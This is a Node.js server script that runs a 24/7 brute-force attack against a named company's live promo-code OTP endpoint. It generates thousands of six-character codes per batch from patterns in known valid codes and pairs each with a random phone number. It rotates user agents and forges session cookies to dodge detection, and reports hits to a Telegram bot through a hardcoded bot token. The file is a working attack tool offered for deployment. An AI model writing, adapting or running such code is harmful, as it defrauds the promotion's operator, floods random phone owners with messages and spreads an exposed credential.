const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = "7987760307:AAEKVDBUZqMtncjLE2zbYBiqsVsYNELJEDo";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ═══════════════════════════════════════════════════════════════
//            GLOBAL BRUTEFORCER (BACKGROUND INFINITE)
// ═══════════════════════════════════════════════════════════════

class GlobalBruteforcer {
    constructor() {
        this.clients = new Set();
        this.chatId = null;
        this.successCodes = new Set();
        this.totalAttempts = 0;
        this.batchNum = 0;
        this.isRunning = false;
        
        this.workingCodes = ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"];
        this.codePatterns = this.analyzeWorkingCodes();
        
        this.baseUrl = "https://www.tictac.com";
        this.endpoint = "/in/en/xp/jarpecarpromo/home/generateOTP";
        
        this.userAgents = [
            'Mozilla/5.0 (Linux; Android 15; V2315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
        ];
        
        this.initTelegram();
        this.startAutoRun();
    }
    
    async initTelegram() {
        try {
            const response = await axios.get(`${TELEGRAM_API}/getUpdates`, { timeout: 30000 });
            if (response.data.result && response.data.result.length > 0) {
                this.chatId = response.data.result[response.data.result.length - 1].message.chat.id;
                console.log('✅ Telegram connected:', this.chatId);
            }
        } catch (error) {
            console.log('⚠️  Telegram connection pending');
            this.chatId = null;
        }
    }
    
    analyzeWorkingCodes() {
        console.log('🔍 Analyzing working code patterns...');
        
        const patterns = {
            positionPatterns: {},
            charFrequencies: {},
            structurePatterns: [],
            prefixSuffix: { prefix: {}, suffix: {} }
        };
        
        for (let position = 0; position < 6; position++) {
            const charsAtPos = this.workingCodes.map(code => code[position]);
            patterns.positionPatterns[position] = {
                letters: charsAtPos.filter(c => /[A-Z]/.test(c)),
                digits: charsAtPos.filter(c => /[0-9]/.test(c)),
                common: [...new Set(charsAtPos)]
            };
        }
        
        const allChars = this.workingCodes.join('');
        for (const char of new Set(allChars)) {
            patterns.charFrequencies[char] = (allChars.match(new RegExp(char, 'g')) || []).length;
        }
        
        for (const code of this.workingCodes) {
            const structure = code.split('').map(c => /[A-Z]/.test(c) ? 'L' : 'D').join('');
            patterns.structurePatterns.push(structure);
        }
        
        for (const code of this.workingCodes) {
            const prefix = code.slice(0, 2);
            const suffix = code.slice(-2);
            patterns.prefixSuffix.prefix[prefix] = (patterns.prefixSuffix.prefix[prefix] || 0) + 1;
            patterns.prefixSuffix.suffix[suffix] = (patterns.prefixSuffix.suffix[suffix] || 0) + 1;
        }
        
        console.log('✅ Pattern analysis complete');
        return patterns;
    }
    
    generateSmartCodes(count = 5000) {
        const codes = new Set(this.workingCodes);
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        
        // Structure-based generation
        const structures = [...new Set(this.codePatterns.structurePatterns)];
        for (let i = 0; i < count * 0.25; i++) {
            const struct = structures[Math.floor(Math.random() * structures.length)];
            let code = '';
            for (const patternChar of struct) {
                if (patternChar === 'L') {
                    code += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)];
                } else {
                    code += Math.floor(Math.random() * 10);
                }
            }
            codes.add(code);
        }
        
        // Position-specific generation
        for (let i = 0; i < count * 0.25; i++) {
            let code = '';
            for (let pos = 0; pos < 6; pos++) {
                const posData = this.codePatterns.positionPatterns[pos];
                const available = [...posData.letters, ...posData.digits];
                code += available.length > 0 
                    ? available[Math.floor(Math.random() * available.length)]
                    : chars[Math.floor(Math.random() * chars.length)];
            }
            codes.add(code);
        }
        
        // Prefix/Suffix based
        const prefixes = Object.keys(this.codePatterns.prefixSuffix.prefix);
        const suffixes = Object.keys(this.codePatterns.prefixSuffix.suffix);
        
        for (let i = 0; i < count * 0.2; i++) {
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)] || chars.slice(0, 2);
            const suffix = suffixes[Math.floor(Math.random() * suffixes.length)] || chars.slice(-2);
            const middle = Array(2).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
            codes.add(prefix + middle + suffix);
        }
        
        // Variations of working codes
        for (const workingCode of this.workingCodes) {
            for (let i = 0; i < 6; i++) {
                const posData = this.codePatterns.positionPatterns[i];
                const available = [...posData.letters, ...posData.digits];
                for (const newChar of available.slice(0, 5)) {
                    if (newChar !== workingCode[i]) {
                        codes.add(workingCode.slice(0, i) + newChar + workingCode.slice(i + 1));
                    }
                }
            }
        }
        
        // Random fill
        while (codes.size < count) {
            const code = Array(6).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
            codes.add(code);
        }
        
        return Array.from(codes).slice(0, count);
    }
    
    generateRandomPhone() {
        const prefix = ['7', '8', '9', '6'][Math.floor(Math.random() * 4)];
        return prefix + Array(9).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
    }
    
    async makeRequest(code, phone) {
        const url = `${this.baseUrl}${this.endpoint}`;
        const headers = {
            'Host': 'www.tictac.com',
            'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'origin': 'https://www.tictac.com',
            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
            'cookie': `PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}`
        };
        
        try {
            const response = await axios.post(url, `phone=${phone}&ccode=${code}`, { headers, timeout: 5000 });
            this.totalAttempts++;
            
            if (response.status === 200) {
                const data = response.data;
                const isSuccess = JSON.stringify(data).toLowerCase().includes('success');
                
                if (isSuccess) {
                    this.successCodes.add(code);
                    return { code, phone, status: 'success', response: data };
                }
                return { code, phone, status: 'failed', response: data };
            }
        } catch (error) {
            return { code, phone, status: 'error', error: error.message };
        }
        
        return null;
    }
    
    async sendSuccessToTelegram(code, phone) {
        if (!this.chatId) return false;
        
        const message = `
🎯 <b>SUCCESS CODE FOUND!</b>

🔑 <b>Code:</b> <code>${code}</code>
📱 <b>Phone:</b> <code>${phone}</code>
⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
📊 <b>Batch:</b> #${this.batchNum}
💎 <b>Total Success:</b> ${this.successCodes.size} codes
        `.trim();
        
        try {
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            }, { timeout: 15000 });
            return true;
        } catch (error) {
            return false;
        }
    }
    
    broadcast(data) {
        const message = JSON.stringify(data);
        this.clients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(message);
            }
        });
    }
    
    async executeBatch() {
        this.batchNum++;
        const startTime = Date.now();
        
        console.log(`\n${'='.repeat(80)}`);
        console.log(`🧠 BATCH #${this.batchNum} STARTED (AUTO-RUN MODE)`);
        console.log('='.repeat(80));
        
        this.broadcast({
            type: 'batch_start',
            batch: this.batchNum,
            message: `🧠 BATCH #${this.batchNum} STARTED`
        });
        
        const codes = this.generateSmartCodes(5000);
        const phones = Array(5000).fill(0).map(() => this.generateRandomPhone());
        
        console.log(`✅ Generated ${codes.length} smart pattern-based codes`);
        
        this.broadcast({
            type: 'codes_generated',
            count: codes.length,
            message: `✅ Generated ${codes.length} smart codes`
        });
        
        let completed = 0;
        let successCount = 0;
        const batchSize = 100;
        
        console.log('⚡ Executing 5000 requests...\n');
        
        for (let i = 0; i < codes.length; i += batchSize) {
            const batch = codes.slice(i, i + batchSize);
            const phoneBatch = phones.slice(i, i + batchSize);
            
            const promises = batch.map((code, idx) => this.makeRequest(code, phoneBatch[idx]));
            const results = await Promise.allSettled(promises);
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value) {
                    completed++;
                    
                    if (result.value.status === 'success') {
                        successCount++;
                        
                        console.log(`🎯 SUCCESS #${successCount}: ${result.value.code} | Phone: ${result.value.phone}`);
                        
                        this.broadcast({
                            type: 'success',
                            code: result.value.code,
                            phone: result.value.phone,
                            successCount,
                            batchNum: this.batchNum,
                            totalSuccess: this.successCodes.size,
                            message: `🎯 SUCCESS #${successCount}: ${result.value.code}`
                        });
                        
                        this.sendSuccessToTelegram(result.value.code, result.value.phone);
                    }
                    
                    if (completed % 1000 === 0) {
                        console.log(`📊 Progress: ${completed}/5000 | Success: ${successCount}`);
                        
                        this.broadcast({
                            type: 'progress',
                            completed,
                            total: 5000,
                            successCount,
                            message: `📊 ${completed}/5000 | Success: ${successCount}`
                        });
                    }
                }
            }
        }
        
        const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
        
        console.log(`\n${'='.repeat(80)}`);
        console.log(`✅ BATCH #${this.batchNum} COMPLETED`);
        console.log('='.repeat(80));
        console.log(`⏱️  Time: ${timeTaken}s`);
        console.log(`🎯 Success: ${successCount} codes`);
        console.log(`📊 Success rate: ${successCount}/5000 (${(successCount/5000*100).toFixed(2)}%)`);
        console.log(`💎 Total working codes: ${this.successCodes.size}`);
        
        if (this.successCodes.size > 0) {
            console.log(`\n🏆 ALL WORKING CODES (Last 20):`);
            const lastCodes = Array.from(this.successCodes).slice(-20);
            lastCodes.forEach((code, idx) => {
                console.log(`   ${idx + 1}. ${code}`);
            });
        }
        
        this.broadcast({
            type: 'batch_complete',
            batch: this.batchNum,
            successCount,
            timeTaken,
            totalSuccess: this.successCodes.size,
            allCodes: Array.from(this.successCodes),
            message: `✅ Batch #${this.batchNum}: ${successCount} success in ${timeTaken}s`
        });
    }
    
    async startAutoRun() {
        this.isRunning = true;
        
        console.log('\n🚀 AUTO-RUN MODE ACTIVATED');
        console.log('🔥 Background execution enabled - Running 24/7');
        console.log('⚡ Unlimited codes will be generated continuously\n');
        
        while (this.isRunning) {
            await this.executeBatch();
            
            console.log('\n⏰ 15 second cooldown before next batch...\n');
            
            this.broadcast({
                type: 'cooldown',
                message: '⏰ 15s cooldown before next batch...'
            });
            
            await new Promise(resolve => setTimeout(resolve, 15000));
        }
    }
    
    addClient(ws) {
        this.clients.add(ws);
        console.log(`✅ Client connected | Total clients: ${this.clients.size}`);
        
        ws.send(JSON.stringify({
            type: 'connected',
            message: '✅ Connected to background bruteforcer',
            batchNum: this.batchNum,
            totalSuccess: this.successCodes.size,
            allCodes: Array.from(this.successCodes)
        }));
    }
    
    removeClient(ws) {
        this.clients.delete(ws);
        console.log(`❌ Client disconnected | Total clients: ${this.clients.size}`);
    }
}

// ═══════════════════════════════════════════════════════════════
//                    EXPRESS + WEBSOCKET SERVER
// ═══════════════════════════════════════════════════════════════

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// START GLOBAL BRUTEFORCER (RUNS IN BACKGROUND ALWAYS)
const globalBruteforcer = new GlobalBruteforcer();

// Simple status endpoint
app.get('/', (req, res) => {
    res.json({
        status: 'running',
        mode: 'auto-run 24/7',
        batchNum: globalBruteforcer.batchNum,
        totalSuccess: globalBruteforcer.successCodes.size,
        successCodes: Array.from(globalBruteforcer.successCodes),
        clients: globalBruteforcer.clients.size,
        message: '🔥 Unlimited bruteforcer running in background'
    });
});

// Health check for Render.com
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

// WebSocket connection handler
wss.on('connection', (ws) => {
    globalBruteforcer.addClient(ws);
    
    ws.on('close', () => {
        globalBruteforcer.removeClient(ws);
    });
    
    ws.on('error', (error) => {
        console.error('WebSocket error:', error.message);
    });
});

// Start server
server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════════════╗
║     🔥 UNLIMITED BRUTEFORCER - AUTO-RUN MODE 24/7            ║
║                                                                ║
║  🌐 Server: http://localhost:${PORT}                            ║
║  🔌 WebSocket: ACTIVE                                         ║
║  🚀 Background Execution: ENABLED                             ║
║  ⚡ Real-time Updates: UNLIMITED                              ║
║  🎯 Auto-Start: YES                                           ║
║  💎 Smart Patterns: ACTIVE                                    ║
║                                                                ║
║  📱 Telegram: ${globalBruteforcer.chatId ? 'CONNECTED ✅' : 'PENDING ⏳'}                                    ║
║  ☁️  Render.com: READY TO DEPLOY                              ║
╚════════════════════════════════════════════════════════════════╝

🔥 Bruteforcer started automatically in background!
📊 Access status: http://localhost:${PORT}/
🔌 WebSocket endpoint: ws://localhost:${PORT}
    `);
});
